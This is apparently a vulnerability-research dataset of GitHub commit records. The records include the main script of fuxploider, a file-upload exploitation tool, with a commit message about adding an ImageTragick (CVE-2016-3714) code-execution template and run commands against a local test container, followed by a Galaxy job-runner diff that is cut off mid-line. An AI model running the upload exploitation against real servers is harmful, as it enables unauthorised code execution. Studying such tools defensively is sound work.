the scanned remote server. Code execution detection is done based on the expected output of the payload.\"\ntemplatesSection += \"\\n\\tDefault templates are the following (name - description) : \"\nfor t in templates :\n\ttemplatesSection+=\"\\n\\t  * '\"+t[\"templateName\"]+\"' - \"+t[\"description\"]\n\nparser = argparse.ArgumentParser(epilog=templatesSection,description=__doc__, formatter_class=argparse.RawTextHelpFormatter)\nparser.add_argument(\"-d\", \"--data\", metavar=\"postData\",dest=\"data\", help=\"Additionnal data to be transmitted via POST method. Example : -d \\\"key1=value1&key2=value2\\\"\", type=valid_postData)\nparser.add_argument(\"--proxy\", metavar=\"proxyUrl\", dest=\"proxy\", help=\"Proxy information. Example : --proxy \\\"user:password@proxy.host:8080\\\"\", type=valid_proxyString)\nparser.add_argument(\"--proxy-creds\",metavar=\"credentials\",nargs='?',const=True,dest=\"proxyCreds\",help=\"Prompt for proxy credentials at runtime. Format : 'user:pass'\",type=valid_proxyCreds)\nparser.add_argument(\"-f\",\"--filesize\",metavar=\"integer\",nargs=1,default=[\"10\"],dest=\"size\",help=\"File size to use for files to be created and uploaded (in kB).\")\nparser.add_argument(\"--cookies\",metavar=\"omnomnom\",nargs=1,dest=\"cookies\",help=\"Cookies to use with HTTP requests. Example : PHPSESSID=aef45aef45afeaef45aef45&JSESSID=AQSEJHQSQSG\",type=valid_postData)\nparser.add_argument(\"--uploads-path\",default=[None],metavar=\"path\",nargs=1,dest=\"uploadsPath\",help=\"Path on the remote server where uploads are put. Example : '/tmp/uploads/'\")\nparser.add_argument(\"-t\",\"--template\",metavar=\"templateName\",nargs=1,dest=\"template\",help=\"Malicious payload to use for code execution detection. Default is to use every known templates. For a complete list of templates, see the TEMPLATE section.\")\nparser.add_argument(\"-r\",\"--regex-override\",metavar=\"regex\",nargs=1,dest=\"regexOverride\",help=\"Specify a regular expression to detect code execution. Overrides the default code execution detection regex defined in the template in use.\",type=valid_regex)\nrequiredNamedArgs = parser.add_argument_group('Required named arguments')\nrequiredNamedArgs.add_argument(\"-u\",\"--url\", metavar=\"target\", dest=\"url\",required=True, help=\"Web page URL containing the file upload form to be tested. Example : http://test.com/index.html?action=upload\", type=valid_url)\nrequiredNamedArgs.add_argument(\"--not-regex\", metavar=\"regex\", help=\"Regex matching an upload failure\", type=valid_regex,dest=\"notRegex\")\nrequiredNamedArgs.add_argument(\"--true-regex\",metavar=\"regex\", help=\"Regex matching an upload success\", type=valid_regex, dest=\"trueRegex\")\n\nexclusiveArgs = parser.add_mutually_exclusive_group()\nexclusiveArgs.add_argument(\"-l\",\"--legit-extensions\",metavar=\"listOfExtensions\",dest=\"legitExtensions\",nargs=1,help=\"Legit extensions expected, for a normal use of the form, comma separated. Example : 'jpg,png,bmp'\")\nexclusiveArgs.add_argument(\"-n\",metavar=\"n\",nargs=1,default=[\"100\"],dest=\"n\",help=\"Number of common extensions to use. Example : -n 100\", type=valid_nArg)\n\nexclusiveVerbosityArgs = parser.add_mutually_exclusive_group()\nexclusiveVerbosityArgs.add_argument(\"-v\",action=\"store_true\",required=False,dest=\"verbose\",help=\"Verbose mode\")\nexclusiveVerbosityArgs.add_argument(\"-vv\",action=\"store_true\",required=False,dest=\"veryVerbose\",help=\"Very verbose mode\")\nexclusiveVerbosityArgs.add_argument(\"-vvv\",action=\"store_true\",required=False,dest=\"veryVeryVerbose\",help=\"Much verbose, very log, wow.\")\n\nparser.add_argument(\"-s\",\"--skip-recon\",action=\"store_true\",required=False,dest=\"skipRecon\",help=\"Skip recon phase, where fuxploider tries to determine what extensions are expected and filtered by the server. Needs -l switch.\")\nparser.add_argument(\"-y\",action=\"store_true\",required=False,dest=\"detectAllEntryPoints\",help=\"Force detection of every entry points. Will not stop at first code exec found.\")\nparser.add_argument(\"-T\",\"--threads\",metavar=\"Threads\",nargs=1,dest=\"nbThreads\",help=\"Number of parallel tasks (threads).\",type=int,default=[4])\n\nexclusiveUserAgentsArgs = parser.add_mutually_exclusive_group()\nexclusiveUserAgentsArgs.add_argument(\"-U\",\"--user-agent\",metavar=\"useragent\",nargs=1,dest=\"userAgent\",help=\"User-agent to use while requesting the target.\",type=str,default=[requests.utils.default_user_agent()])\nexclusiveUserAgentsArgs.add_argument(\"--random-user-agent\",action=\"store_true\",required=False,dest=\"randomUserAgent\",help=\"Use a random user-agent while requesting the target.\")\n\nmanualFormArgs = parser.add_argument_group('Manual Form Detection arguments')\nmanualFormArgs.add_argument(\"-m\",\"--manual-form-detection\",action=\"store_true\",dest=\"manualFormDetection\",help=\"Disable automatic form detection. Useful when automatic detection fails due to: (1) Form loaded using Javascript (2) Multiple file upload forms in URL.\")\nmanualFormArgs.add_argument(\"--input-name\",metavar=\"image\",dest=\"inputName\",help=\"Name of input for file. Example: <input type=\\\"file\\\" name=\\\"image\\\">\")\nmanualFormArgs.add_argument(\"--form-action\",default=\"\",metavar=\"upload.php\",dest=\"formAction\",help=\"Path of form action. Example: <form method=\\\"POST\\\" action=\\\"upload.php\\\">\")\n\nargs = parser.parse_args()\nargs.uploadsPath = args.uploadsPath[0]\nargs.nbThreads = args.nbThreads[0]\nargs.userAgent = args.userAgent[0]\n\nif args.randomUserAgent :\n\twith open(\"user-agents.txt\",\"r\") as fd :\n\t\tnb = 0\n\t\tfor l in fd :\n\t\t\tnb += 1\n\t\tfd.seek(0)\n\t\tnb = random.randint(0,nb)\n\t\tfor i in range(0,nb) :\n\t\t\targs.userAgent = fd.readline()[:-1]\n\nif args.template :\n\targs.template = args.template[0]\n\tif args.template not in templatesNames :\n\t\tlogging.warning(\"Unknown template : %s\",args.template)\n\t\tcont = input(\"Use default templates instead ? [Y/n]\")\n\t\tif not cont.lower().startswith(\"y\") :\n\t\t\texit()\n\telse :\n\t\ttemplates = [[x for x in templates if x[\"templateName\"] == args.template][0]]\nif args.regexOverride :\n\tfor t in templates :\n\t\tt[\"codeExecRegex\"] = args.regexOverride[0]\n\nargs.verbosity = 0\nif args.verbose :\n\targs.verbosity = 1\nif args.veryVerbose :\n\targs.verbosity = 2\nif args.veryVeryVerbose :\n\targs.verbosity = 3\nlogger.verbosity = args.verbosity\nif args.verbosity > 0 :\n\tcoloredlogs.install(logger=logger,fmt='%(asctime)s %(levelname)s - %(message)s',level=logging.DEBUG)\n\n\nif args.proxyCreds and args.proxy == None :\n\tparser.error(\"--proxy-creds must be used with --proxy.\")\n\nif args.skipRecon and args.legitExtensions == None :\n\tparser.error(\"-s switch needs -l switch. Cannot skip recon phase without any known entry point.\")\n\nargs.n = int(args.n[0])\nargs.size = int(args.size[0])\nargs.size = 1024*args.size\n\nif not args.notRegex and not args.trueRegex :\n\tparser.error(\"At least one detection method must be provided, either with --not-regex or with --true-regex.\")\n\nif args.legitExtensions :\n\targs.legitExtensions = args.legitExtensions[0].split(\",\")\n\nif args.cookies :\n\targs.cookies = postDataFromStringToJSON(args.cookies[0])\n\nif args.manualFormDetection and args.inputName is None:\n\tparser.error(\"--manual-form-detection requires --input-name\")\n\nprint(\"\"\"\\033[1;32m\n                                     \n ___             _     _   _         \n|  _|_ _ _ _ ___| |___|_|_| |___ ___ \n|  _| | |_'_| . | | . | | . | -_|  _|\n|_| |___|_,_|  _|_|___|_|___|___|_|  \n            |_|                      \n\n\\033[1m\\033[42m{version \"\"\"+version+\"\"\"}\\033[m\n\n\\033[m[!] legal disclaimer : Usage of fuxploider for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program\n\t\"\"\")\nif args.proxyCreds == True :\n\targs.proxyCreds = {}\n\targs.proxyCreds[\"username\"] = input(\"Proxy username : \")\n\targs.proxyCreds[\"password\"] = getpass.getpass(\"Proxy password : \")\n\nnow = datetime.datetime.now()\n\nprint(\"[*] starting at \"+str(now.hour)+\":\"+str(now.minute)+\":\"+str(now.second))\n\n#mimeFile = \"mimeTypes.advanced\"\nmimeFile = \"mimeTypes.basic\"\nextensions = loadExtensions(\"file\",mimeFile)\ntmpLegitExt = []\nif args.legitExtensions :\n\targs.legitExtensions = [x.lower() for x in args.legitExtensions]\n\tfoundExt = [a[0] for a in extensions]\n\tfor b in args.legitExtensions :\n\t\tif b in foundExt :\n\t\t\ttmpLegitExt.append(b)\n\t\telse :\n\t\t\tlogging.warning(\"Extension %s can't be found as a valid/known extension with associated mime type.\",b)\nargs.legitExtensions = tmpLegitExt\n\npostData = postDataFromStringToJSON(args.data)\n\ns = requests.Session()\nif args.cookies :\n\tfor key in args.cookies.keys() :\n\t\ts.cookies[key] = args.cookies[key]\ns.headers = {'User-Agent':args.userAgent}\n##### PROXY HANDLING #####\ns.trust_env = False\nif args.proxy :\n\tif args.proxy[\"username\"] and args.proxy[\"password\"] and args.proxyCreds :\n\t\tlogging.warning(\"Proxy username and password provided by the --proxy-creds switch replaces credentials provided using the --proxy switch\")\n\tif args.proxyCreds :\n\t\tproxyUser = args.proxyCreds[\"username\"]\n\t\tproxyPass = args.proxyCreds[\"password\"]\n\telse :\n\t\tproxyUser = args.proxy[\"username\"]\n\t\tproxyPass = args.proxy[\"password\"]\n\tproxyProtocol = args.proxy[\"protocol\"]\n\tproxyHostname = args.proxy[\"hostname\"]\n\tproxyPort = args.proxy[\"port\"]\n\tproxy = \"\"\n\tif proxyProtocol != None :\n\t\tproxy += proxyProtocol+\"://\"\n\telse :\n\t\tproxy += \"http://\"\n\n\tif proxyUser != None and proxyPass != None :\n\t\tproxy += proxyUser+\":\"+proxyPass+\"@\"\n\n\tproxy += proxyHostname\n\tif proxyPort != None :\n\t\tproxy += \":\"+proxyPort\n\n\tif proxyProtocol == \"https\" :\n\t\tproxies = {\"https\":proxy}\n\telse :\n\t\tproxies = {\"http\":proxy,\"https\":proxy}\n\n\ts.proxies.update(proxies)\n#########################################################\n\nif args.manualFormDetection:\n\tif args.formAction == \"\":\n\t\tlogger.warning(\"Using Manual Form Detection and no action specified with --form-action. Defaulting to empty string - meaning form action will be set to --url parameter.\")\n\tup = UploadForm(args.notRegex,args.trueRegex,s,args.size,postData,args.uploadsPath,args.url,args.formAction,args.inputName)\nelse:\n\tup = UploadForm(args.notRegex,args.trueRegex,s,args.size,postData,args.uploadsPath)\n\tup.setup(args.url)\nup.threads = args.nbThreads\n#########################################################\n\n############################################################\nuploadURL = up.uploadUrl\nfileInput = {\"name\":up.inputName}\n\n###### VALID EXTENSIONS DETECTION FOR THIS FORM ######\n\na = datetime.datetime.now()\n\nif not args.skipRecon :\n\tif len(args.legitExtensions) > 0 :\n\t\tn = up.detectValidExtensions(extensions,args.n,args.legitExtensions)\n\telse :\n\t\tn = up.detectValidExtensions(extensions,args.n)\n\tlogger.info(\"### Tried %s extensions, %s are valid.\",n,len(up.validExtensions))\nelse :\n\tlogger.info(\"### Skipping detection of valid extensions, using provided extensions instead (%s)\",args.legitExtensions)\n\tup.validExtensions = args.legitExtensions\n\nif up.validExtensions == [] :\n\tlogger.error(\"No valid extension found.\")\n\texit()\n\nb = datetime.datetime.now()\nprint(\"Extensions detection : \"+str(b-a))\n\n\n##############################################################################################################################################\n##############################################################################################################################################\ncont = input(\"Start uploading payloads ? [Y/n] : \")\nup.shouldLog = True\nif cont.lower().startswith(\"y\") or cont == \"\" :\n\tpass\nelse :\n\texit(\"Exiting.\")\n\nentryPoints = []\nup.stopThreads = True\n\nwith open(\"techniques.json\",\"r\") as rawTechniques :\n\ttechniques = json.loads(rawTechniques.read())\nlogger.info(\"### Starting code execution detection (messing with file extensions and mime types...)\")\nc = datetime.datetime.now()\nnbOfEntryPointsFound = 0\nattempts = []\ntemplatesData = {}\n\nfor template in templates :\n\ttemplatefd = open(templatesFolder+\"/\"+template[\"filename\"],\"rb\")\n\ttemplatesData[template[\"templateName\"]] = templatefd.read()\n\ttemplatefd.close()\n\tnastyExt = template[\"nastyExt\"]\n\tnastyMime = getMime(extensions,nastyExt)\n\tnastyExtVariants = template[\"extVariants\"]\n\tfor t in techniques :\n\t\tfor nastyVariant in [nastyExt]+nastyExtVariants :\n\t\t\tfor legitExt in up.validExtensions :\n\t\t\t\tlegitMime = getMime(extensions,legitExt)\n\t\t\t\tmime = legitMime if t[\"mime\"] == \"legit\" else nastyMime\n\t\t\t\tsuffix = t[\"suffix\"].replace(\"$legitExt$\",legitExt).replace(\"$nastyExt$\",nastyVariant)\n\t\t\t\tattempts.append({\"suffix\":suffix,\"mime\":mime,\"templateName\":template[\"templateName\"]})\n\n\nstopThreads = False\n\nattemptsTested = 0\n\nwith concurrent.futures.ThreadPoolExecutor(max_workers=args.nbThreads) as executor :\n\tfutures = []\n\ttry :\n\t\tfor a in attempts :\n\t\t\tsuffix = a[\"suffix\"]\n\t\t\tmime = a[\"mime\"]\n\t\t\tpayload = templatesData[a[\"templateName\"]]\n\t\t\tcodeExecRegex = [t[\"codeExecRegex\"] for t in templates if t[\"templateName\"] == a[\"templateName\"]][0]\n\n\t\t\tf = executor.submit(up.submitTestCase,suffix,mime,payload,codeExecRegex)\n\t\t\tf.a = a\n\t\t\tfutures.append(f)\n\n\t\tfor future in concurrent.futures.as_completed(futures) :\n\t\t\tres = future.result()\n\t\t\tattemptsTested += 1\n\t\t\tif not stopThreads :\n\t\t\t\tif res[\"codeExec\"] :\n\n\t\t\t\t\tfoundEntryPoint = future.a\n\t\t\t\t\tlogging.info(\"\\033[1m\\033[42mCode execution obtained ('%s','%s','%s')\\033[m\",foundEntryPoint[\"suffix\"],foundEntryPoint[\"mime\"],foundEntryPoint[\"templateName\"])\n\t\t\t\t\tnbOfEntryPointsFound += 1\n\t\t\t\t\tentryPoints.append(foundEntryPoint)\n\n\t\t\t\t\tif not args.detectAllEntryPoints :\n\t\t\t\t\t\traise KeyboardInterrupt\n\n\texcept KeyboardInterrupt :\n\t\tstopThreads = True\n\t\texecutor.shutdown(wait=False)\n\t\texecutor._threads.clear()\n\t\tconcurrent.futures.thread._threads_queues.clear()\n\t\tlogger.setLevel(logging.CRITICAL)\n\t\tlogger.verbosity = -1\n\n\n################################################################################################################################################\n################################################################################################################################################\nd = datetime.datetime.now()\n#print(\"Code exec detection : \"+str(d-c))\nprint()\nlogging.info(\"%s entry point(s) found using %s HTTP requests.\",nbOfEntryPointsFound,up.httpRequests)\nprint(\"Found the following entry points : \")\nprint(entryPoints)"}}, "msg": "Added detection of vulnerable ImageMagick\n\nAdded a new template named \"imagetragick\" that detects if the file\nupload is vulnerable to CVE-2016-3714, which is a Remote Code Execution\nvulnerability in the ImageMagick software. By uploading a crafted file\nit is possible to run arbitrary commands on the server if vulnerable.\nThe command performed by the template on vulnerable servers creates a\nfile with the text \"ImageTragick Detected!\" in the same directory as the\nupload form page.\n\nSince no malicious extension is needed for the exploitation of this\nvulnerability, support has been added for templates without \"nasty\"\nextensions. This vulnerability can be exploited by uploading a variety\nof image filetypes (png, jpg etc.), so all legitimate filetypes\nsupported by the file upload in the server will be tried.\n\nTested against a docker machine running a vulnerable instance of\nImageMagick. For testing, created a variant of a docker machine created\nby the chinese VulApps: http://vulapps.evalbug.com/i_imagemagick_1/\nThe docker variant used for testing can be found by running:\n- docker pull madhatter37/vulnerable_apps:imagemagick_1.0.2\n- docker run -d -p 80:80 madhatter37/vulnerable_apps:imagemagick_1.0.2\n- ./fuxploider.py --uploads-path uploads -u http://127.0.0.1/file_upload/poc.php --not-regex \"your file was not uploaded\" --true-regex \"has been uploaded to\" --data \"submit=Submit\" --template=imagetragick"}}, "https://github.com/chrisbarnettster/galaxy_interactive_testing": {"98a560ccd19355db632109732fadc46c51f7768c": {"url": "https://api.github.com/repos/chrisbarnettster/galaxy_interactive_testing/commits/98a560ccd19355db632109732fadc46c51f7768c", "html_url": "https://github.com/chrisbarnettster/galaxy_interactive_testing/commit/98a560ccd19355db632109732fadc46c51f7768c", "sha": "98a560ccd19355db632109732fadc46c51f7768c", "keyword": "remote code execution correct", "diff": "diff --git a/lib/galaxy/jobs/runners/lwr.py b/lib/galaxy/jobs/runners/lwr.py\nindex 1f33ae252e..7c8d3d3e5c 100644\n--- a/lib/galaxy/jobs/runners/lwr.py\n+++ b/lib/galaxy/jobs/runners/lwr.py\n@@ -172,7 +172,6 @@ def __prepare_job(self, job_wrapper, job_destination):\n             job_wrapper.prepare( **prepare_kwds )\n             self.__prepare_input_files_locally(job_wrapper)\n             remote_metadata = LwrJobRunner.__remote_metadata( client )\n-            remote_work_dir_copy = LwrJobRunner.__remote_work_dir_copy( client )\n             dependency_resolution = LwrJobRunner.__dependency_resolution( client )\n             metadata_kwds = self.__build_metadata_configuration(client, job_wrapper, remote_metadata, remote_job_config)\n             remote_command_params = dict(\n@@ -184,7 +183,7 @@ def __prepare_job(self, job_wrapper, job_destination):\n                 self,\n                 job_wrapper=job_wrapper,\n                 include_metadata=remote_metadata,\n-                include_work_dir_outputs=remote_work_dir_copy,\n+                include_work_dir_outputs=False,\n                 remote_command_params=remote_command_params,\n             )\n         except Exception:\n@@ -358,13 +357,7 @@ def shutdown( self ):\n         self.client_manager.shutdown()\n \n     def __client_outputs( self, client, job_wrapper ):\n-        remote_work_dir_copy = LwrJobRunner.__remote_work_dir_copy( client )\n-        if not remote_work_dir_copy:\n-            work_dir_outputs = self.get_work_dir_outputs( job_wrapper )\n-        else:\n-            # They have already been copied over to look like regular outputs remotely,\n-            # no need to handle them differently here.\n-            work_dir_outputs = []\n+        work_dir_outputs = self.get_work_dir_outputs( job_wrapper )\n         output_files = self.get_output_files( job_wrapper )\n         client_outputs = ClientOutputs(\n             working_directory=job_wrapper.working_directory,\n@@ -399,16 +392,6 @@ def __remote_metadata( lwr_client ):\n         remote_metadata = string_as_bool_or_none( lwr_client.destination_params.get( \"remote_metadata\", False ) )\n         return remote_metadata\n \n-    @staticmethod\n-    def __remote_work_dir_copy( lwr_client ):\n-        # Right now remote metadata handling assumes from_work_dir outputs\n-        # have been copied over before it runs. So do that remotely. This is\n-        # not the default though because adding it to the command line is not\n-        # cross-platform (no cp on Windows) and it's un-needed work outside\n-        # the context of metadata settting (just as easy to download from\n-        # either place.)\n-        return LwrJobRunner.__remote_metadata( lwr_client )\n-\n     @staticmethod\n     def __use_remote_datatypes_conf( lwr_client ):\n         \"\"\" When setting remote metadata, use integrated datatypes from this\n@@ -440,7 +423,21 @@ def __build_metadata_configuration(self, client, job_wrapper, remote_metadata, r\n             outputs_directory = remote_job_config['outputs_directory']\n             configs_directory = remote_job_config['configs_directory']\n             working_directory = remote_job_config['working_directory']\n+            # For metadata calculation, we need to build a list of of output\n+            # file objects with real path indicating location on Galaxy server\n+            # and false path indicating location on compute server. Since the\n+            # LWR disables from_work_dir copying as part of the job command\n+            # line we need to take the list of output locations on the LWR\n+            # server (produced by self.get_output_files(job_wrapper)) and for\n+            # each work_dir output substitute the effective path on the LWR\n+            # server relative to the remote working directory as the\n+            # false_path to send the metadata command generation module.\n+            work_dir_outputs = self.get_work_dir_outputs(job_wrapper, job_working_directory=working_directory)\n             outputs = [Bunch(false_path=os.path.join(outputs_directory, os.path.basename(path)), real_path=path) for path in self.get_output_files(job_wrapper)]\n+            for output in outputs:\n+                for lwr_workdir_path, real_path in work_dir_outputs:\n+                    if real_path == output.real_path:\n+                        output.false_path = lwr_workdir_path\n             metadata_kwds['output_fnames'] = outputs\n             metadata_kwds['compute_tmp_dir'] = working_directory\n             metadata_kwds['config_root'] = remote_galaxy_home\n", "message": "", "files": {"/lib/galaxy/jobs/runners/lwr.py": {"changes": [{"diff": "\n             job_wrapper.prepare( **prepare_kwds )\n             self.__prepare_input_files_locally(job_wrapper)\n             remote_metadata = LwrJobRunner.__remote_metadata( client )\n-            remote_work_dir_copy = LwrJobRunner.__remote_work_dir_copy( client )\n             dependency_resolution = LwrJobRunner.__dependency_resolution( client )\n             metadata_kwds = self.__build_metadata_configuration(client, job_wrapper, remote_metadata, remote_job_config)\n             remote_command_params = dict(\n", "add": 0, "remove": 1, "filename": "/lib/galaxy/jobs/runners/lwr.py", "badparts": ["            remote_work_dir_copy = LwrJobRunner.__remote_work_dir_copy( client )"], "goodparts": []}, {"diff": "\n                 self,\n                 job_wrapper=job_wrapper,\n                 include_metadata=remote_metadata,\n-                include_work_dir_outputs=remote_work_dir_copy,\n+                include_work_dir_outputs=False,\n                 remote_command_params=remote_command_params,\n             )\n         except Exception:\n", "add": 1, "remove": 1, "filename": "/lib/galaxy/jobs/runners/lwr.py", "badparts": ["                include_work_dir_outputs=remote_work_dir_copy,"], "goodparts": ["                include_work_dir_outputs=False,"]}, {"diff": "\n         self.client_manager.shutdown()\n \n     def __client_outputs( self, client, job_wrapper ):\n-        remote_work_dir_copy = LwrJobRunner.__remote_work_dir_copy( client )\n-        if not remote_work_dir_copy:\n-            work_dir_outputs = self.get_work_dir_outputs( job_wrapper )\n-        else:\n-            # They have already been copied over to look like regular outputs remotely,\n-            # no need to handle them differently here.\n-            work_dir_outputs = []\n+        work_dir_outputs = self.get_work_dir_outputs( job_wrapper )\n         output_files = self.get_output_files( job_wrapper )\n         client_outputs = ClientOutputs(\n             working_directory=job_wrapper.working_directory,\n", "add": 1, "remove": 7, "filename": "/lib/galaxy/jobs/runners/lwr.py", "badparts": ["        remote_work_dir_copy = LwrJobRunner.__remote_work_dir_copy( client )", "        if not remote_work_dir_copy:", "            work_dir_outputs = self.get_work_dir_outputs( job_wrapper )", "        else:", "            work_dir_outputs = []"], "goodparts": ["        work_dir_outputs = self.get_work_dir_outputs( job_wrapper )"]}, {"diff": "\n         remote_metadata = string_as_bool_or_none( lwr_client.destination_params.get( \"remote_metadata\", False ) )\n         return remote_metadata\n \n-    @staticmethod\n-    def __remote_work_dir_copy( lwr_client ):\n-        # Right now remote metadata handling assumes from_work_dir outputs\n-        # have been copied over before it runs. So do that remotely. This is\n-        # not the default though because adding it to the command line is not\n-        # cross-platform (no cp on Windows) and it's un-needed work outside\n-        # the context of metadata settting (just as easy to download from\n-        # either place.)\n-        return LwrJobRunner.__remote_metadata( lwr_client )\n-\n     @staticmethod\n     def __use_remote_datatypes_conf( lwr_client ):\n         \"\"\" When setting remote metadata, use integrated datatypes from this\n", "add": 0, "remove": 10, "filename": "/lib/galaxy/jobs/runners/lwr.py", "badparts": ["    @staticmethod", "    def __remote_work_dir_copy( lwr_client ):", "        return LwrJobRunner.__remote_metadata( lwr_client )"], "goodparts": []}], "source": "\nimport logging from galaxy import model from galaxy.jobs.runners import AsynchronousJobState, AsynchronousJobRunner from galaxy.jobs import ComputeEnvironment from galaxy.jobs import JobDestination from galaxy.jobs.command_factory import build_command from galaxy.tools.deps import dependencies from galaxy.util import string_as_bool_or_none from galaxy.util.bunch import Bunch import errno from time import sleep import os from.lwr_client import build_client_manager from.lwr_client import url_to_destination_params from.lwr_client import finish_job as lwr_finish_job from.lwr_client import submit_job as lwr_submit_job from.lwr_client import ClientJobDescription from.lwr_client import LwrOutputs from.lwr_client import ClientOutputs from.lwr_client import PathMapper log=logging.getLogger( __name__) __all__=[ 'LwrJobRunner'] NO_REMOTE_GALAXY_FOR_METADATA_MESSAGE=\"LWR misconfiguration -LWR client configured to set metadata remotely, but remote LWR isn't properly configured with a galaxy_home directory.\" NO_REMOTE_DATATYPES_CONFIG=\"LWR client is configured to use remote datatypes configuration when setting metadata externally, but LWR is not configured with this information. Defaulting to datatypes_conf.xml.\" DEFAULT_GALAXY_URL=\"http://localhost:8080\" class LwrJobRunner( AsynchronousJobRunner): \"\"\" LWR Job Runner \"\"\" runner_name=\"LWRRunner\" def __init__( self, app, nworkers, transport=None, cache=None, url=None, galaxy_url=DEFAULT_GALAXY_URL): \"\"\"Start the job runner \"\"\" super( LwrJobRunner, self).__init__( app, nworkers) self.async_status_updates=dict() self._init_monitor_thread() self._init_worker_threads() client_manager_kwargs={'transport_type': transport, 'cache': string_as_bool_or_none(cache), \"url\": url} self.galaxy_url=galaxy_url self.client_manager=build_client_manager(**client_manager_kwargs) def url_to_destination( self, url): \"\"\"Convert a legacy URL to a job destination\"\"\" return JobDestination( runner=\"lwr\", params=url_to_destination_params( url)) def check_watched_item(self, job_state): try: client=self.get_client_from_state(job_state) if hasattr(self.client_manager, 'ensure_has_status_update_callback'): self.client_manager.ensure_has_status_update_callback(self.__async_update) return job_state status=client.get_status() except Exception: self.mark_as_finished(job_state) return None job_state=self.__update_job_state_for_lwr_status(job_state, status) return job_state def __update_job_state_for_lwr_status(self, job_state, lwr_status): if lwr_status==\"complete\": self.mark_as_finished(job_state) return None if lwr_status==\"running\" and not job_state.running: job_state.running=True job_state.job_wrapper.change_state( model.Job.states.RUNNING) return job_state def __async_update( self, full_status): job_id=full_status[ \"job_id\"] job_state=self.__find_watched_job( job_id) if not job_state: sleep( 2) job_state=self.__find_watched_job( job_id) if not job_state: log.warn( \"Failed to find job corresponding to final status %s in %s\" %( full_status, self.watched)) else: self.__update_job_state_for_lwr_status(job_state, full_status[\"status\"]) def __find_watched_job( self, job_id): found_job=None for async_job_state in self.watched: if str( async_job_state.job_id)==job_id: found_job=async_job_state break return found_job def queue_job(self, job_wrapper): job_destination=job_wrapper.job_destination command_line, client, remote_job_config, compute_environment=self.__prepare_job( job_wrapper, job_destination) if not command_line: return try: dependencies_description=LwrJobRunner.__dependencies_description( client, job_wrapper) rewrite_paths=not LwrJobRunner.__rewrite_parameters( client) unstructured_path_rewrites={} if compute_environment: unstructured_path_rewrites=compute_environment.unstructured_path_rewrites client_job_description=ClientJobDescription( command_line=command_line, input_files=self.get_input_files(job_wrapper), client_outputs=self.__client_outputs(client, job_wrapper), working_directory=job_wrapper.working_directory, tool=job_wrapper.tool, config_files=job_wrapper.extra_filenames, dependencies_description=dependencies_description, env=client.env, rewrite_paths=rewrite_paths, arbitrary_files=unstructured_path_rewrites, ) job_id=lwr_submit_job(client, client_job_description, remote_job_config) log.info(\"lwr job submitted with job_id %s\" % job_id) job_wrapper.set_job_destination( job_destination, job_id) job_wrapper.change_state( model.Job.states.QUEUED) except Exception: job_wrapper.fail( \"failure running job\", exception=True) log.exception(\"failure running job %d\" % job_wrapper.job_id) return lwr_job_state=AsynchronousJobState() lwr_job_state.job_wrapper=job_wrapper lwr_job_state.job_id=job_id lwr_job_state.old_state=True lwr_job_state.running=False lwr_job_state.job_destination=job_destination self.monitor_job(lwr_job_state) def __prepare_job(self, job_wrapper, job_destination): \"\"\" Build command-line and LWR client for this job. \"\"\" command_line=None client=None remote_job_config=None compute_environment=None try: client=self.get_client_from_wrapper(job_wrapper) tool=job_wrapper.tool remote_job_config=client.setup(tool.id, tool.version) rewrite_parameters=LwrJobRunner.__rewrite_parameters( client) prepare_kwds={} if rewrite_parameters: compute_environment=LwrComputeEnvironment( client, job_wrapper, remote_job_config) prepare_kwds[ 'compute_environment']=compute_environment job_wrapper.prepare( **prepare_kwds) self.__prepare_input_files_locally(job_wrapper) remote_metadata=LwrJobRunner.__remote_metadata( client) remote_work_dir_copy=LwrJobRunner.__remote_work_dir_copy( client) dependency_resolution=LwrJobRunner.__dependency_resolution( client) metadata_kwds=self.__build_metadata_configuration(client, job_wrapper, remote_metadata, remote_job_config) remote_command_params=dict( working_directory=remote_job_config['working_directory'], metadata_kwds=metadata_kwds, dependency_resolution=dependency_resolution, ) command_line=build_command( self, job_wrapper=job_wrapper, include_metadata=remote_metadata, include_work_dir_outputs=remote_work_dir_copy, remote_command_params=remote_command_params, ) except Exception: job_wrapper.fail( \"failure preparing job\", exception=True) log.exception(\"failure running job %d\" % job_wrapper.job_id) if not command_line: job_wrapper.finish( '', '') return command_line, client, remote_job_config, compute_environment def __prepare_input_files_locally(self, job_wrapper): \"\"\"Run task splitting commands locally.\"\"\" prepare_input_files_cmds=getattr(job_wrapper, 'prepare_input_files_cmds', None) if prepare_input_files_cmds is not None: for cmd in prepare_input_files_cmds: if 0 !=os.system(cmd): raise Exception('Error running file staging command: %s' % cmd) job_wrapper.prepare_input_files_cmds=None def get_output_files(self, job_wrapper): output_paths=job_wrapper.get_output_fnames() return[ str( o) for o in output_paths] def get_input_files(self, job_wrapper): input_paths=job_wrapper.get_input_paths() return[ str( i) for i in input_paths] def get_client_from_wrapper(self, job_wrapper): job_id=job_wrapper.job_id if hasattr(job_wrapper, 'task_id'): job_id=\"%s_%s\" %(job_id, job_wrapper.task_id) params=job_wrapper.job_destination.params.copy() for key, value in params.iteritems(): if value: params[key]=model.User.expand_user_properties( job_wrapper.get_job().user, value) env=getattr( job_wrapper.job_destination, \"env\",[]) return self.get_client( params, job_id, env) def get_client_from_state(self, job_state): job_destination_params=job_state.job_destination.params job_id=job_state.job_id return self.get_client( job_destination_params, job_id) def get_client( self, job_destination_params, job_id, env=[]): encoded_job_id=self.app.security.encode_id(job_id) job_key=self.app.security.encode_id( job_id, kind=\"jobs_files\") files_endpoint=\"%s/api/jobs/%s/files?job_key=%s\" %( self.galaxy_url, encoded_job_id, job_key ) get_client_kwds=dict( job_id=str( job_id), files_endpoint=files_endpoint, env=env ) return self.client_manager.get_client( job_destination_params, **get_client_kwds) def finish_job( self, job_state): stderr=stdout='' job_wrapper=job_state.job_wrapper try: client=self.get_client_from_state(job_state) run_results=client.full_status() stdout=run_results.get('stdout', '') stderr=run_results.get('stderr', '') exit_code=run_results.get('returncode', None) lwr_outputs=LwrOutputs.from_status_response(run_results) completed_normally=\\ job_wrapper.get_state() not in[ model.Job.states.ERROR, model.Job.states.DELETED] cleanup_job=self.app.config.cleanup_job client_outputs=self.__client_outputs(client, job_wrapper) finish_args=dict( client=client, job_completed_normally=completed_normally, cleanup_job=cleanup_job, client_outputs=client_outputs, lwr_outputs=lwr_outputs) failed=lwr_finish_job( **finish_args) if failed: job_wrapper.fail(\"Failed to find or download one or more job outputs from remote server.\", exception=True) except Exception: message=\"Failed to communicate with remote job server.\" job_wrapper.fail( message, exception=True) log.exception(\"failure finishing job %d\" % 